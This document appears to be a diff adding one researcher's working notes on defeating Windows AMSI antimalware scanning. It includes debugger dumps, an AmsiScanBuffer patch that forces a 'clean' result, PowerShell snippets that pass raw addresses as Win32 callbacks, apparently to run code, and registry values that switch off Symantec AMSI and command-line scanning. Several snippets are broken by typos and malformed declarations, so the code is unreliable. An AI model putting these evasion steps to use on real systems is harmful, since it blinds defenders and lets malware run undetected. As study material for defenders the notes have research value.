@@ -1,0 +1,260 @@
+PDB> Unable to locate PDB file "Amsi.pdb" with matching GUID.
+ You may set the PDB "Symbol Repository Path"
+ using "Edit->Options for [program]" prior to analysis.
+It is important that a PDB is used during initial analysis 
+if available.
+Windows x86 PE RTTI Analyzer> Couldn't find type info structure.
+
+
+call stack 
+amsi.dll AmsiScanBuffer
+mpoav.dll 
+mpclient MpAmsiScan
+
+
+mov eax, fs:[30]
+add eax, 0x18
+mov eax, dword ptr [eax]
+#then we get the heap... 
+
+0:015> dt _PEB
+ntdll!_PEB
+   +0x000 InheritedAddressSpace : UChar
+   +0x001 ReadImageFileExecOptions : UChar
+   +0x002 BeingDebugged    : UChar
+   +0x003 BitField         : UChar
+   +0x003 ImageUsesLargePages : Pos 0, 1 Bit
+   +0x003 IsProtectedProcess : Pos 1, 1 Bit
+   +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit
+   +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit
+   +0x003 IsPackagedProcess : Pos 4, 1 Bit
+   +0x003 IsAppContainer   : Pos 5, 1 Bit
+   +0x003 IsProtectedProcessLight : Pos 6, 1 Bit
+   +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit
+   +0x004 Mutant           : Ptr32 Void
+   +0x008 ImageBaseAddress : Ptr32 Void
+   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA
+   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS
+   +0x014 SubSystemData    : Ptr32 Void
+   +0x018 ProcessHeap      : Ptr32 Void
+
+#peb
+0:015> db fs:[30]
+0053:00000030  00 40 7c 00 00 00 00 00-00 00 00 00 00 00 00 00 .@|.............
+
+#peb.processheap
+0:012> db 007c4018
+007c4018  00 00 be 00 40 5b 40 77-00 00 00 00 00 00 00 00  ....@[@w........
+
+
+0:012> !heap
+        Heap Address      NT/Segment Heap
+
+              be0000              NT Heap
+              e60000              NT Heap
+              d40000              NT Heap
+              e20000              NT Heap
+             4ec0000              NT Heap
+             4e80000              NT Heap
+             70b0000              NT Heap
+
+
+0:012> !heap 00be0000
+Index   Address  Name      Debugging options enabled
+  1:   00be0000 
+    Segment at 00be0000 to 00cdf000 (000ff000 bytes committed)
+    Segment at 07340000 to 0743f000 (000ff000 bytes committed)
+    Segment at 07c10000 to 07e0f000 (00094000 bytes committed)
+
+
+0:012> !address 00be0000
+
+Usage:                  Heap
+Base Address:           00be0000
+End Address:            00c59000
+
+0:012> dt _HEAP_SEGMENT 00be0000
+ntdll!_HEAP_SEGMENT
+   +0x000 Entry            : _HEAP_ENTRY
+   +0x008 SegmentSignature : 0xffeeffee
+   +0x00c SegmentFlags     : 2
+   +0x010 SegmentListEntry : _LIST_ENTRY [ 0x7340010 - 0xbe00a4 ]
+   +0x018 Heap             : 0x00be0000 _HEAP
+   +0x01c BaseAddress      : 0x00be0000 Void
+   +0x020 NumberOfPages    : 0xff
+   +0x024 FirstEntry       : 0x00be04a8 _HEAP_ENTRY
+   +0x028 LastValidEntry   : 0x00cdf000 _HEAP_ENTRY
+
+
+0:012> db esi #esi is amsi context
+00cc7300  41 4d 53 49 48 3e 36 07-f8 98 e6 00 0a 28 00 00  AMSIH>6......(..   
+
+address of esi is < LastValidEntry
+
+amsiscanbuffer patch:
+
+10005128 | 33C0                     | xor eax,eax                             | eax:"0Q"
+1000512A | C2 1800                  | ret 18                                  |
+1000512D | CC                       | int3                                    |
+1000512E | CC                       | int3                                    |
+1000512F | CC                       | int3                                    |
+10005130 | EB F6                    | jmp amsi.10005128                       |
+10005132 | 55                       | push ebp                                |
+
+
+
+$Winpatch = @"
+using System;
+using System.Runtime.InteropServices;
+
+class Win32
+{
+    [DllImport("kernel32")]
+    public static extern bool EnumLanguageGroupLocalesA(LANGGROUPLOCALE_ENUMPROCA lpLangGroupLocaleEnumProc, LGRPID LanguageGroup, DWORD dwFlags, LONG_PTR lParam);
+}
+"@
+
+Add-Type -TypeDefinition $Winpatch -Language CSharp
+
+
+
+
+
+function Update-UserPreferencesMask {
+    $Signature = @"
+[DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
+public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);
+
+const int SPI_SETTHREADLOCALINPUTSETTINGS = 0x104F; 
+const int SPIF_UPDATEINIFILE = 0x01; 
+const int SPIF_SENDCHANGE = 0x02;
+
+ 
+public static void UpdateUserPreferencesMask() {
+    SystemParametersInfo(SPI_SETTHREADLOCALINPUTSETTINGS, 0, 1, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+}
+
+"@
+    Add-Type -MemberDefinition $Signature -Name UserPreferencesMaskSPI -Namespace User32
+    [User32.UserPreferencesMaskSPI]::UpdateUserPreferencesMask()
+
+}
+
+Update-UserPreferencesMask
+
+
+
+function Get-EnumLanguageGroupLocalesA {
+    $Signature2 = @"
+[DllImport("kernel32.dll", EntryPoint = "EnumLanguageGroupLocalesA")]
+public static extern bool EnumLanguageGroupLocalesA(uint lpLangGroupLocaleEnumProc, uint LanguageGroup, uint dwFlags, uint lParam);
+
+const int lpLangGroupLocaleEnumProc = 0x41414141;
+const int LanguageGroup = 0x01;
+const int dwFlags = 0x00;
+const int lParam = 0x42424242;
+
+public static void GetUserLanguageGroupA(){
+	EnumLangaugeGroupLocalesA(lpLangGroupLocaleEnumProc, LanguageGroup, dwFlags, lParam);
+}
+"@
+
+Add-Type -MemberDefinition $Signature2 -Name EnumLangaugeGroupLocales -Namespace Win32Functions -PassThru
+[Kernel32.EnumLangaugeGroupLocales]::GetUserLanguageGroupA()
+
+}
+
+
+
+
+
+$Signature2 = @"
+[DllImport("kernel32.dll", public static extern bool EnumLanguageGroupLocalesA(uint lpLangGroupLocaleEnumProc, uint LanguageGroup, uint dwFlags, uint lParam);
+"@
+
+
+
+$test = Add-Type -MemberDefinition $Signature2 -Name "Win32EnumLanguageGroupLocalesA" -Namespace Win32Functions -PassThru
+
+
+
+
+
+
+
+function Update-UserPreferencesMask {
+    $Signature = @"
+[DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
+public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);
+ 
+const int SPI_SETTHREADLOCALINPUTSETTINGS = 0x104F; 
+const int SPIF_UPDATEINIFILE = 0x01; 
+const int SPIF_SENDCHANGE = 0x02;
+ 
+public static void UpdateUserPreferencesMask() {
+    SystemParametersInfo(SPI_SETTHREADLOCALINPUTSETTINGS, 0, 1, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+}
+"@
+    Add-Type -MemberDefinition $Signature -Name UserPreferencesMaskSPI -Namespace User32
+    [User32.UserPreferencesMaskSPI]::UpdateUserPreferencesMask()
+}
+
+Update-UserPreferencesMask
+
+
+
+
+
+
+function Update-EnumPropsExW_1{
+	$sig = @"
+
+[DllImport("user32.dll", EntryPoint="EnumPropsExW")]
+public static extern int EnumPropsExW( int hwind, uint lpfunc, string lParam);
+
+const int HWIND =  330586;
+const int LPFUNC = 0x072C0000;
+const string LPARAM = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+
+public static void UpdateEnumPropsExW(){
+	EnumPropsExW(HWIND, LPFUNC, LPARAM);
+}
+"@
+	Add-Type -MemberDefinition $sig -Name EnumPropsExWSPI_1 -Namespace User32
+	[User32.EnumPropsExWSPI_1]::UpdateEnumPropsExW()
+}
+
+
+
+function Update-EnumPropsExW{
+	$sig = @"
+
+[DllImport("user32.dll", EntryPoint="EnumPropsExW")]
+public static extern int EnumPropsExW( uint hwind, uint lpfunc, string lParam);
+
+const int HWIND =  0x20592;
+const int LPFUNC = 0x072C0000;
+const string LPARAM = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+
+public static void UpdateEnumPropsExW(){
+	uint i;
+	int outval;
+	uint tmp = 0x00ffffffff;
+	for (i = 0x00000011; i < tmp; i++){
+		outval = EnumPropsExW(i, LPFUNC, LPARAM);
+		if (outval == 1337){
+			break;
+			}
+		}
+}
+"@
+	Add-Type -MemberDefinition $sig -Name EnumPropsExASPI -Namespace User32
+	[User32.EnumPropsExASPI]::UpdateEnumPropsExW()
+}
+
+
+
+
+HKLM\SOFTWARE\WOW6432Node\Symantec\Symantec Endpoint Protection\AV\Storages\Filesystem\RealTimeScan
+AMSIEnables = 0x00000000
+CommandLineScanEnabled = 0x00000000
